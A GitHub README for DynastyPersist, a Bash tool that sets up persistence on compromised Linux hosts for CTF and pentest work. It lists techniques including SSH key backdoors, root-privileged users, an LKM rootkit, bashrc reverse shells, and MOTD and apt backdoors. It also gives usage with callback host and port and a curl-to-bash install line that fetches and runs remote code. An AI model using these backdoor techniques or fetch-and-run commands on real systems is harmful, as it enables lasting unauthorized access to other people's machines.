

<h1 align="center">DynastyPersist 1.4</h1>

<p align="center">
  DynastyPersist: A streamlined tool for achieving Linux persistence effortlessly.<br>
  Supports <b><i>KoTH, Battlegrounds and Pentest Operations</i></b><br>
   <br>
  <img alt="GitHub License" src="https://img.shields.io/github/license/Trevohack/DynastyPersist?style=for-the-badge&labelColor=blue&color=violet">
  <img alt="GitHub Repo stars" src="https://img.shields.io/github/stars/Trevohack/DynastyPersist?style=for-the-badge&labelColor=blue&color=violet">
  <img alt="Static Badge" src="https://img.shields.io/badge/Tested--on-Linux-violet?style=for-the-badge&logo=linux&logoColor=black&labelColor=blue">
  <img alt="Static Badge" src="https://img.shields.io/badge/Bash-violet?style=for-the-badge&logo=gnubash&logoColor=black&labelColor=blue">
</p> 

## Documentation

### [ FEATURES ]

| Features | Description |
| :-------- | :-------   | 
| **SSH Key Generation** |  Automatically generates SSH keys for covert access.  |
| **Cronjob Persistence** | Sets up cronjobs for scheduled persistence. |
| **Custom User with Root** | Creates a custom user with root privileges. |
| **RCE Persistence** | Achieves persistence through remote code execution |
| **LKM/Rootkit** | Demonstrates Linux Kernel Module (LKM) based rootkit persistence. | 
| **Bashrc Persistence** | Modifies user-specific shell initialization files for persistence (aliases / reverse shells). |
| **Systemd Service for Root** | Sets up a systemd service for achieving root persistence. |
| **LD_PRELOAD Privilege Escalation Config** | Configures LD_PRELOAD for privilege escalation. |
| **Backdooring Message of the Day / Header** | Backdoors system message display for covert access. |
| **Modify an Existing Systemd Service** | Manipulates an existing systemd service for persistence. |
| **Backdoors APT Command** | Backdoors `apt` command to pop up a shell. |


### [ MODES ]

* Currently, there are 2 modes available in the latest update (1.4).

* Modes are `normal` and `ctf` which are designed to work in a specific behavior.

* Firstly, `normal` mode enters the tool in the usual setup, with all features. These features will run locally on the local host where the script is being executed. Designed for persistence in real-time operations.

* Secondly, `ctf` (beta) mode is an extra feature to log in to a compromised server via SSH and gain persistence. This addon will help a lot in KoTH or Battlegrounds. Further, this will save a lot of time taken for setting up persistence. 

* In comparison, the `normal` mode comes with more features and stability than the `ctf` mode. 

### [ USAGE ] 

* The syntax to use the tool is described below: 

```bash
$ ./dynasty.sh <lhost> <lport> <mode> 
$ ./dynasty.sh ctf 
$ ./dynasty.sh 10.10.14.3 9999 normal
``` 

## Installation

Via Git
```bash
$ git clone https://github.com/Trevohack/DynastyPersist
$ cd DynastyPersist/src 
``` 

Via Curl 
```bash
$ curl -sSL https://raw.githubusercontent.com/Trevohack/DynastyPersist/main/src/dynasty.sh | bash
```


